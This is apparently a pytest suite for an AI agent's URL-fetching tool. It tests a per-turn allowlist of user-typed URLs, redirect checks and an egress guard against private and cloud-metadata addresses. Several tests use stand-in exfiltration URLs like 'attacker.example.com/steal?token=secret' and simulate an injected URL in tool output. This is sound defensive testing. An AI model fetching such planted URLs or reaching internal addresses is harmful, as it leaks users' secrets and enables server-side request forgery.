"""Tests for fetch_url_tool per-turn URL allowlist (prompt scoping + runtime enforcement)."""

import socket
from contextlib import contextmanager
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch
from urllib.parse import urlparse

import httpx
import pytest
from langchain_core.runnables import RunnableConfig

from models.chat import Message, MessageSender, MessageType
from utils.retrieval.agentic import (
    AGENT_SAFETY_INSTRUCTIONS,
    _inject_user_url_allowlist,
    agent_config_context,
)
from utils.retrieval.tools.web_tools import (
    URL_ALREADY_FETCHED_MESSAGE,
    URL_NOT_ALLOWLISTED_MESSAGE,
    _canonical_user_url,
    _is_disallowed_ip,
    _resolve_public_ips,
    extract_urls_from_text,
    extract_user_turn_urls,
    fetch_url_tool,
    is_redirect_url_allowlisted,
    is_url_allowlisted,
    user_url_allowlist_block,
)


def _message(text: str, sender: MessageSender = MessageSender.human, id_: str = 'm1') -> Message:
    return Message(
        id=id_,
        text=text,
        created_at=datetime.now(timezone.utc),
        sender=sender,
        type=MessageType.text,
    )


@contextmanager
def _turn_configurable(configurable):
    """Mirror production: agentic.py stores the turn's original configurable dict in
    agent_config_context, because LangChain shallow-copies `configurable` per tool
    invocation and per-call state written to the copy would not survive."""
    token = agent_config_context.set({'configurable': configurable})
    try:
        yield
    finally:
        agent_config_context.reset(token)


class TestUrlExtraction:
    def test_extracts_urls_from_user_message(self):
        urls = extract_urls_from_text('Check https://example.com/article and http://foo.bar/baz.')
        assert urls == ['https://example.com/article', 'http://foo.bar/baz']

    def test_strips_trailing_punctuation(self):
        urls = extract_urls_from_text('See https://example.com/page, thanks!')
        assert urls == ['https://example.com/page']

    def test_preserves_balanced_parentheses(self):
        urls = extract_urls_from_text('See https://en.wikipedia.org/wiki/Function_(mathematics).')
        assert urls == ['https://en.wikipedia.org/wiki/Function_(mathematics)']

    def test_returns_all_urls_for_overflow_detection(self):
        text = ' '.join(f'https://example.com/{index}' for index in range(11))
        assert len(extract_urls_from_text(text)) == 11

    def test_extract_user_turn_urls_ignores_assistant_messages(self):
        messages = [
            _message('Old https://old.example.com/page'),
            _message('Reply with https://attacker.example.com/exfil', MessageSender.ai),
            _message('Summarize https://user.example.com/doc'),
        ]
        assert extract_user_turn_urls(messages) == ['https://user.example.com/doc']

    def test_extract_user_turn_urls_strips_sentence_terminal_punctuation(self):
        messages = [_message('Summarize https://example.com/article.')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_explicit_delimiters(self):
        messages = [_message('Fetch <https://example.com/releases/v1.0.>')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_parentheses(self):
        messages = [_message('Fetch (https://example.com/releases/v1.0.)')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.']

    def test_extract_user_turn_urls_strips_unwrapped_sentence_punctuation(self):
        messages = [_message('Fetch https://example.com/article.!?')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article']

    def test_extract_user_turn_urls_preserves_all_terminal_url_punctuation_in_backticks(self):
        messages = [_message('Fetch `https://example.com/releases/v1.0.!?`')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.!?']

    def test_extract_user_turn_urls_strips_closing_markdown_delimiters(self):
        messages = [_message('Fetch **https://example.com/article** and [https://example.com/docs]')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article', 'https://example.com/docs']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_markdown_delimiters(self):
        messages = [_message('Fetch **https://example.com/releases/v1.0.** and [https://example.com/releases/v2.0.?]')]
        assert extract_user_turn_urls(messages) == [
            'https://example.com/releases/v1.0.',
            'https://example.com/releases/v2.0.?',
        ]

    def test_extract_user_turn_urls_strips_closing_markdown_delimiters_before_sentence_punctuation(self):
        messages = [_message('Fetch **https://example.com/article**. and [https://example.com/docs].')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article', 'https://example.com/docs']

    def test_extracted_terminal_url_punctuation_matches_literal_allowlist(self):
        url = extract_user_turn_urls([_message('Fetch <https://example.com/releases/v1.0.>')])[0]
        assert is_url_allowlisted(url, [url])

    def test_extract_user_turn_urls_strips_single_emphasis_delimiters(self):
        messages = [_message('Fetch *https://example.com/article* and _https://example.com/docs_')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article', 'https://example.com/docs']

    def test_single_emphasis_is_not_read_off_double_emphasis(self):
        """`**url**` must strip both stars, not leave one behind as single emphasis."""
        messages = [_message('Fetch **https://example.com/article**')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article']

    def test_prose_url_allowlists_both_stripped_and_literal_spellings(self):
        """Sentence punctuation and URL punctuation are indistinguishable from text alone,
        so an ambiguous prose URL contributes both the stripped primary and the literal
        spelling the user typed."""
        messages = [_message('Read https://example.com/releases/v1.0.')]
        assert extract_user_turn_urls(messages, include_literal_variants=True) == [
            'https://example.com/releases/v1.0',
            'https://example.com/releases/v1.0.',
        ]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0']

    def test_literal_variants_do_not_expand_the_url_budget(self):
        """max_urls bounds distinct user URLs; variants ride along without admitting an
        extra primary, and URLs past the budget contribute no spelling at all."""
        text = ' '.join(f'https://example.com/{index}.' for index in range(6))
        urls = extract_urls_from_text(
            text, preserve_terminal_punctuation=True, include_literal_variants=True, max_urls=5
        )
        assert urls == [f'https://example.com/{index}{suffix}' for index in range(5) for suffix in ('', '.')]
        assert all('https://example.com/5' not in url for url in urls)

    def test_query_delimiter_is_part_of_the_allowlist_identity(self):
        """`/path` and `/path?` are different request targets, so an allowlist entry for
        one must not unlock the other after the page is listed."""
        bare = _canonical_user_url('https://example.com/path', strip_trailing_punctuation=False)
        delimited = _canonical_user_url('https://example.com/path?', strip_trailing_punctuation=False)
        assert bare is not None and delimited is not None
        assert bare != delimited
        assert bare[-1] == '' and delimited[-1] == '?'
        assert not is_url_allowlisted('https://example.com/path', ['https://example.com/path?'])
        assert not is_url_allowlisted('https://example.com/path?', ['https://example.com/path'])
        assert is_url_allowlisted('https://example.com/path?', ['https://example.com/path?'])

    def test_extract_user_turn_urls_honors_initiating_message_id(self):
        """With overlapping sends in a shared history, the message that initiated this
        request is the authoritative turn, not the newest human message."""
        messages = [
            _message('Summarize https://initiating.example.com/doc', id_='turn-1'),
            _message('Also read https://newer.example.com/page', id_='turn-2'),
        ]
        assert extract_user_turn_urls(messages, initiating_message_id='turn-1') == [
            'https://initiating.example.com/doc'
        ]
        # Without an id (single-send history), the latest user turn still wins.
        assert extract_user_turn_urls(messages) == ['https://newer.example.com/page']

    def test_extract_user_turn_urls_ignores_unknown_initiating_message_id(self):
        messages = [_message('Summarize https://user.example.com/doc', id_='turn-1')]
        assert extract_user_turn_urls(messages, initiating_message_id='missing') == ['https://user.example.com/doc']

    def test_extract_user_turn_urls_bounds_overflow_scan(self):
        messages = [_message(' '.join(f'https://example.com/{index}' for index in range(1000)))]
        assert len(extract_user_turn_urls(messages, max_urls=11)) == 11

    def test_user_url_allowlist_block_empty_when_no_urls(self):
        assert user_url_allowlist_block([]) == ''

    def test_user_url_allowlist_block_lists_urls(self):
        block = user_url_allowlist_block(['https://example.com/a'])
        assert '<user_provided_urls>' in block
        assert 'https://example.com/a' in block


class TestPromptScoping:
    def test_agent_safety_instructions_forbid_unscoped_fetch(self):
        assert 'fetch_url_tool must not be used' in AGENT_SAFETY_INSTRUCTIONS
        assert '<user_provided_urls>' in AGENT_SAFETY_INSTRUCTIONS
        assert 'tool results' in AGENT_SAFETY_INSTRUCTIONS

    def test_agent_safety_instructions_carry_no_exception_the_runtime_cannot_honor(self):
        """is_url_allowlisted admits only URLs typed in the current turn, so the prompt must not
        promise that a user request can unlock a URL that came from retrieved data."""
        assert 'unless the user explicitly asks' not in AGENT_SAFETY_INSTRUCTIONS
        assert not is_url_allowlisted('https://retrieved.example.com/link', [])

    def test_inject_user_url_allowlist_prepends_to_latest_user_turn(self):
        messages = [{'role': 'user', 'content': 'hello https://example.com'}]
        updated = _inject_user_url_allowlist(messages, ['https://example.com'])
        assert '<user_provided_urls>' in updated[0]['content']
        assert 'https://example.com' in updated[0]['content']

    def test_inject_user_url_allowlist_skips_when_empty(self):
        messages = [{'role': 'user', 'content': 'hello'}]
        assert _inject_user_url_allowlist(messages, []) == messages


class TestRuntimeEnforcement:
    @pytest.mark.asyncio
    async def test_rejects_url_not_in_allowlist(self):
        config = RunnableConfig(configurable={'user_provided_urls': ['https://allowed.example.com']})
        result = await fetch_url_tool.ainvoke(
            {'url': 'https://attacker.example.com/steal?token=secret'},
            config=config,
        )
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_attacker_url_from_tool_result_scenario(self):
        """Simulate model trying to fetch a URL embedded in untrusted tool output."""
        user_url = 'https://user.example.com/article'
        attacker_url = 'https://attacker.example.com/exfil?data=leaked'
        config = RunnableConfig(configurable={'user_provided_urls': [user_url]})

        with patch('utils.retrieval.tools.web_tools._fetch_page', new_callable=AsyncMock) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': attacker_url}, config=config)

        assert result == URL_NOT_ALLOWLISTED_MESSAGE
        mock_fetch.assert_not_called()

    @pytest.mark.asyncio
    async def test_rejects_when_allowlist_empty(self):
        config = RunnableConfig(configurable={'user_provided_urls': []})
        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'}, config=config)
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_when_allowlist_missing(self):
        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'})
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_allows_allowlisted_url(self):
        allowed = 'https://example.com/page'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed
        assert 'Content from' in result
        assert 'Hello' in result

    @pytest.mark.asyncio
    async def test_malformed_url_returns_a_bounded_error_instead_of_raising(self):
        malformed = 'https://['
        config = RunnableConfig(configurable={'user_provided_urls': [malformed]})

        with patch('utils.retrieval.tools.web_tools._fetch_page', new_callable=AsyncMock) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': malformed}, config=config)

        assert result.startswith('Error:')
        mock_fetch.assert_not_called()

    @pytest.mark.asyncio
    async def test_malformed_allowlist_entry_does_not_abort_a_valid_fetch(self):
        allowed = 'https://example.com/page'
        config = RunnableConfig(configurable={'user_provided_urls': ['https://[', allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed
        assert 'Hello' in result

    @pytest.mark.asyncio
    async def test_outbound_url_keeps_the_allowlisted_empty_query_delimiter(self):
        allowed = 'https://example.com/path?'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed

    @pytest.mark.asyncio
    async def test_each_allowlisted_url_fetches_once_per_turn(self):
        """A repeat request to an unchanged destination is observable by that server, so
        the second fetch of the same canonical URL must be refused within the turn."""
        allowed = 'https://example.com/page'
        configurable = {'user_provided_urls': [allowed]}
        config = RunnableConfig(configurable=configurable)
        body = (200, 'text/html', '<html><body><p>Hello</p></body></html>')

        with (
            _turn_configurable(configurable),
            patch(
                'utils.retrieval.tools.web_tools._fetch_page',
                new_callable=AsyncMock,
                return_value=body,
            ) as mock_fetch,
        ):
            first = await fetch_url_tool.ainvoke({'url': allowed}, config=config)
            second = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert 'Hello' in first
        assert second == URL_ALREADY_FETCHED_MESSAGE
        assert mock_fetch.await_count == 1

    @pytest.mark.asyncio
    async def test_consumption_is_per_allowlisted_spelling(self):
        """An ambiguous prose URL allowlists both spellings, and each spelling — a
        distinct request target — may be fetched once; repeats of either are refused."""
        literal = 'https://example.com/releases/v1.0.'
        stripped = 'https://example.com/releases/v1.0'
        # The real extraction allowlists both spellings for an ambiguous prose URL.
        configurable = {'user_provided_urls': [stripped, literal]}
        config = RunnableConfig(configurable=configurable)

        with (
            _turn_configurable(configurable),
            patch(
                'utils.retrieval.tools.web_tools._fetch_page',
                new_callable=AsyncMock,
                return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
            ) as mock_fetch,
        ):
            first = await fetch_url_tool.ainvoke({'url': literal}, config=config)
            second = await fetch_url_tool.ainvoke({'url': stripped}, config=config)
            repeat = await fetch_url_tool.ainvoke({'url': literal}, config=config)

        assert 'Hello' in first and 'Hello' in second
        assert repeat == URL_ALREADY_FETCHED_MESSAGE
        assert mock_fetch.await_count == 2

    @pytest.mark.asyncio
    async def test_a_different_url_still_fetches_after_consumption(self):
        first_url = 'https://example.com/one'
        second_url = 'https://example.com/two'
        configurable = {'user_provided_urls': [first_url, second_url]}
        config = RunnableConfig(configurable=configurable)
        body = (200, 'text/html', '<html><body><p>Hello</p></body></html>')

        with (
            _turn_configurable(configurable),
            patch(
                'utils.retrieval.tools.web_tools._fetch_page',
                new_callable=AsyncMock,
                return_value=body,
            ) as mock_fetch,
        ):
            await fetch_url_tool.ainvoke({'url': first_url}, config=config)
            other = await fetch_url_tool.ainvoke({'url': second_url}, config=config)

        assert 'Hello' in other
        assert mock_fetch.await_count == 2

    @pytest.mark.asyncio
    async def test_failed_fetch_still_consumes_the_url(self):
        """A failed attempt still hit the network once, so it counts as this turn's fetch."""
        allowed = 'https://example.com/page'
        configurable = {'user_provided_urls': [allowed]}
        config = RunnableConfig(configurable=configurable)

        with (
            _turn_configurable(configurable),
            patch(
                'utils.retrieval.tools.web_tools._fetch_page',
                new_callable=AsyncMock,
                side_effect=httpx.ConnectError('unreachable'),
            ),
        ):
            first = await fetch_url_tool.ainvoke({'url': allowed}, config=config)
            second = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert 'Failed to fetch' in first
        assert second == URL_ALREADY_FETCHED_MESSAGE

    @pytest.mark.asyncio
    async def test_outbound_url_lowercases_only_the_scheme(self):
        allowed = 'HTTPS://example.com/Path?A=B#Frag'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == 'https://example.com/Path?A=B#Frag'

    def test_is_url_allowlisted_rejects_outbound_trailing_punctuation(self):
        allowlist = ['https://example.com/page']
        assert not is_url_allowlisted('https://example.com/page.', allowlist)

    def test_is_url_allowlisted_accepts_literal_terminal_punctuation(self):
        allowlist = ['https://example.com/releases/v1.0.']
        assert is_url_allowlisted('https://example.com/releases/v1.0.', allowlist)

    def test_is_url_allowlisted_rejects_unlisted_path_parameters(self):
        allowlist = ['https://example.com/page']
        assert not is_url_allowlisted('https://example.com/page;secret', allowlist)

    def test_is_url_allowlisted_canonicalizes_host_and_default_port(self):
        allowlist = ['HTTPS://Example.COM:443/page']
        assert is_url_allowlisted('https://example.com/page', allowlist)

    def test_is_url_allowlisted_distinguishes_trailing_dot_hostname(self):
        assert not is_url_allowlisted('https://example.com/page', ['https://example.com./page'])
        assert is_url_allowlisted('https://example.com./page', ['https://example.com./page'])

    def test_is_url_allowlisted_rejects_unlisted_same_host_variants(self):
        allowlist = ['http://example.com/page']
        assert not is_url_allowlisted('https://example.com/page/', allowlist)
        assert not is_url_allowlisted('https://www.example.com/canonical', allowlist)
        assert not is_url_allowlisted('https://Example.COM/other', allowlist)
        assert not is_url_allowlisted('https://other.example/page', allowlist)

    def test_is_redirect_url_allowlisted_rejects_unlisted_same_host_variants(self):
        allowlist = ['http://example.com/page']
        assert not is_redirect_url_allowlisted('https://example.com/page/', allowlist)
        assert not is_redirect_url_allowlisted('https://www.example.com/canonical', allowlist)
        assert not is_redirect_url_allowlisted('https://other.example/page', allowlist)

    def test_is_redirect_url_allowlisted_allows_same_origin_canonical_redirect(self):
        allowlist = ['https://Example.COM:443/short']
        assert is_redirect_url_allowlisted('https://example.com/full', allowlist)

    @pytest.mark.asyncio
    async def test_rejects_same_host_variant_of_allowlisted_url(self):
        allowlist_url = 'http://example.com/page'
        fetch_url = 'https://www.example.com/canonical'
        config = RunnableConfig(configurable={'user_provided_urls': [allowlist_url]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': fetch_url}, config=config)

        mock_fetch.assert_not_called()
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_redirect_to_non_allowlisted_url(self):
        """Redirect targets must stay on an allowlisted host."""
        allowed = 'https://trusted.example/short'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 302
                self.headers = {'location': 'https://other.example/malicious'}

            async def aiter_bytes(self, chunk_size=8192):
                if False:
                    yield b''

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return _FakeResponse()

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch(
                'utils.retrieval.tools.web_tools._resolve_public_ips',
                new_callable=AsyncMock,
                return_value=['93.184.216.34'],
            ),
        ):
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert 'Redirect target is not in the current-turn user allowlist' in result
        assert client.urls == ['https://93.184.216.34/short']

    @pytest.mark.asyncio
    async def test_allows_redirect_to_allowlisted_url(self):
        start = 'https://trusted.example/short'
        target = 'https://trusted.example/full'
        config = RunnableConfig(configurable={'user_provided_urls': [start, target]})

        class _FakeResponse:
            def __init__(self, status_code, headers=None, body=b''):
                self.status_code = status_code
                self.headers = headers or {}
                self._body = body

            async def aiter_bytes(self, chunk_size=8192):
                if self._body:
                    yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []
                self._responses = [
                    _FakeResponse(302, headers={'location': target}),
                    _FakeResponse(200, headers={'content-type': 'text/html'}, body=b'<p>Hello</p>'),
                ]

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return self._responses.pop(0)

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch(
                'utils.retrieval.tools.web_tools._resolve_public_ips',
                new_callable=AsyncMock,
                return_value=['93.184.216.34'],
            ),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert client.urls == [
            'https://93.184.216.34/short',
            'https://93.184.216.34/full',
        ]
        assert 'Content from' in result
        assert 'Hello' in result


# Destinations that are not globally routable unicast. Each must fail closed at the
# egress guard; the hand-written private-range denylist let most of these through.
NON_GLOBAL_DESTINATIONS = [
    '0.0.0.0',
    '255.255.255.255',
    '198.18.0.1',
    '224.0.0.1',
    '192.0.2.1',
    '203.0.113.9',
    '240.0.0.1',
    '127.0.0.1',
    '169.254.169.254',
    '10.0.0.1',
    '172.16.0.1',
    '192.168.1.1',
    '100.64.0.1',
    '::',
    '::1',
    'ff02::1',
    'fe80::1',
    'fc00::1',
    '2001:db8::1',
    '::ffff:127.0.0.1',
    '::ffff:169.254.169.254',
]

GLOBAL_DESTINATIONS = ['8.8.8.8', '93.184.216.34', '2606:4700:4700::1111']


def _fake_getaddrinfo(address: str):
    family = socket.AF_INET6 if ':' in address else socket.AF_INET
    sockaddr = (address, 0, 0, 0) if family == socket.AF_INET6 else (address, 0)

    def _resolver(host, port, *args, **kwargs):
        return [(family, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', sockaddr)]

    return _resolver


class _RecordingClient:
    """Stand-in HTTP client that records any request the guard failed to stop."""

    def __init__(self):
        self.urls = []

    def stream(self, method, url, **kwargs):
        self.urls.append(url)
        raise AssertionError(f'egress guard allowed a request to {url}')


class TestEgressAddressBounds:
    @pytest.mark.parametrize('address', NON_GLOBAL_DESTINATIONS)
    def test_non_global_addresses_are_blocked(self, address):
        assert _is_disallowed_ip(address) is True

    @pytest.mark.parametrize('address', GLOBAL_DESTINATIONS)
    def test_global_addresses_are_allowed(self, address):
        assert _is_disallowed_ip(address) is False

    def test_unparseable_address_is_blocked(self):
        assert _is_disallowed_ip('not-an-ip') is True

    @pytest.mark.asyncio
    @pytest.mark.parametrize('address', NON_GLOBAL_DESTINATIONS)
    async def test_hostname_resolving_to_non_global_address_is_not_public(self, address):
        with patch.object(socket, 'getaddrinfo', _fake_getaddrinfo(address)):
            assert await _resolve_public_ips('reserved.example') == []

    @pytest.mark.asyncio
    @pytest.mark.parametrize('address', ['0.0.0.0', '198.18.0.1', '224.0.0.1', '255.255.255.255', '::', 'ff02::1'])
    async def test_fetch_url_tool_refuses_reserved_destination_without_issuing_request(self, address):
        """An allowlisted URL whose host resolves to a reserved address must never be fetched."""
        url = 'https://reserved.example/page'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})
        client = _RecordingClient()

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo(address)),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert client.urls == []
        assert 'private or reserved address' in result

    @pytest.mark.asyncio
    async def test_redirect_to_reserved_destination_is_blocked_before_second_request(self):
        """A same-host redirect passes the allowlist but must still fail the address guard."""
        start = 'https://trusted.example/short'
        target = 'https://trusted.example/internal'
        config = RunnableConfig(configurable={'user_provided_urls': [start]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 302
                self.headers = {'location': target}

            async def aiter_bytes(self, chunk_size=8192):
                if False:
                    yield b''

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return _FakeResponse()

        client = _FakeClient()
        resolved = iter(['93.184.216.34', '169.254.169.254'])

        def _resolver(host, port, *args, **kwargs):
            return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', (next(resolved), 0))]

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _resolver),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert client.urls == ['https://93.184.216.34/short']
        assert 'private or reserved address' in result

    @pytest.mark.asyncio
    async def test_redirect_with_mixed_case_scheme_is_accepted(self):
        """A Location header may spell the scheme in any case; the redirect
        target must be accepted case-insensitively like the entry-point URL.
        Regression: `Http://...` after urljoin failed the lowercase startswith
        check and aborted the fetch of a valid, user-allowlisted redirect."""
        start = 'https://trusted.example/short'
        target = 'Http://trusted.example/full'
        config = RunnableConfig(configurable={'user_provided_urls': [start, target]})

        class _FakeResponse:
            def __init__(self, status_code, location=None):
                self.status_code = status_code
                self.headers = {'location': location} if location else {'content-type': 'text/html'}
                self._body = b'<p>Landed</p>'

            async def aiter_bytes(self, chunk_size=8192):
                yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                if len(self.urls) == 1:
                    return _FakeResponse(302, location=target)
                return _FakeResponse(200)

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo('93.184.216.34')),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert 'Landed' in result
        assert client.urls == ['https://93.184.216.34/short', 'http://93.184.216.34/full']

    @pytest.mark.asyncio
    async def test_fetch_connects_to_pinned_ip_not_re_resolved_hostname(self):
        """The guard's resolved public IP must be the only lookup: the HTTP
        client receives the pinned IP (with the original hostname only as Host
        header/SNI), so a request-time re-resolution cannot be redirected to a
        private address. Regression: the guard returned a public IP for the
        hostname, but a second lookup at connect time would hit the cloud
        metadata address 169.254.169.254.
        """
        url = 'https://trusted.example/article'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 200
                self.headers = {'content-type': 'text/html'}
                self._body = b'<p>Hello</p>'

            async def aiter_bytes(self, chunk_size=8192):
                yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _MetadataRebindClient:
            """A client that would reach 169.254.169.254 if it re-resolved the
            hostname at connect time. It must instead be handed the pinned IP."""

            def __init__(self):
                self.urls = []
                self.last_kwargs = None

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                self.last_kwargs = kwargs
                if urlparse(url).hostname == 'trusted.example':
                    raise AssertionError('client received the hostname and would re-resolve it to 169.254.169.254')
                return _FakeResponse()

        client = _MetadataRebindClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo('93.184.216.34')),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert client.urls == ['https://93.184.216.34/article']
        assert client.last_kwargs['headers']['Host'] == 'trusted.example'
        assert client.last_kwargs['extensions']['sni_hostname'] == 'trusted.example'
        assert 'Hello' in result

    @pytest.mark.asyncio
    async def test_fetch_falls_through_to_the_next_resolved_address(self):
        """A resolver may front an unreachable record (commonly a dead AAAA ahead of a
        working A); the fetch must try every safe address before failing the hop."""
        url = 'https://dualstack.example/article'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 200
                self.headers = {'content-type': 'text/html'}
                self._body = b'<p>Second try</p>'

            async def aiter_bytes(self, chunk_size=8192):
                yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FirstAddressUnreachableClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, pinned_url, **kwargs):
                self.urls.append(pinned_url)
                if '2606:4700:dead::1' in pinned_url:
                    raise httpx.ConnectError('dead AAAA record')
                return _FakeResponse()

        client = _FirstAddressUnreachableClient()

        def _resolver(host, port, *args, **kwargs):
            return [
                (socket.AF_INET6, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('2606:4700:dead::1', 0, 0, 0)),
                (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('93.184.216.34', 0)),
            ]

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _resolver),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert 'Second try' in result
        assert client.urls == ['https://[2606:4700:dead::1]/article', 'https://93.184.216.34/article']

    @pytest.mark.asyncio
    async def test_fetch_raises_the_last_error_when_every_address_fails(self):
        url = 'https://dualstack.example/article'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})

        class _AlwaysUnreachableClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, pinned_url, **kwargs):
                self.urls.append(pinned_url)
                raise httpx.ConnectError(f'unreachable via {pinned_url}')

        client = _AlwaysUnreachableClient()

        def _resolver(host, port, *args, **kwargs):
            return [
                (socket.AF_INET6, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('2606:4700:dead::1', 0, 0, 0)),
                (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('93.184.216.34', 0)),
            ]

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _resolver),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert len(client.urls) == 2
        assert 'Failed to fetch' in result

    @pytest.mark.asyncio
    async def test_resolver_keeps_only_bounded_deduped_public_records(self):
        """Duplicated, private, and excess records collapse to a bounded ordered list."""
        records = [
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('93.184.216.34', 0)),
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('93.184.216.34', 0)),  # duplicate
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('10.0.0.1', 0)),  # private
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('8.8.8.8', 0)),
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('8.8.4.4', 0)),
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('1.1.1.1', 0)),
            (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', ('9.9.9.9', 0)),  # past the bound
        ]

        def _resolver(host, port, *args, **kwargs):
            return records

        with patch.object(socket, 'getaddrinfo', _resolver):
            ips = await _resolve_public_ips('many.example')

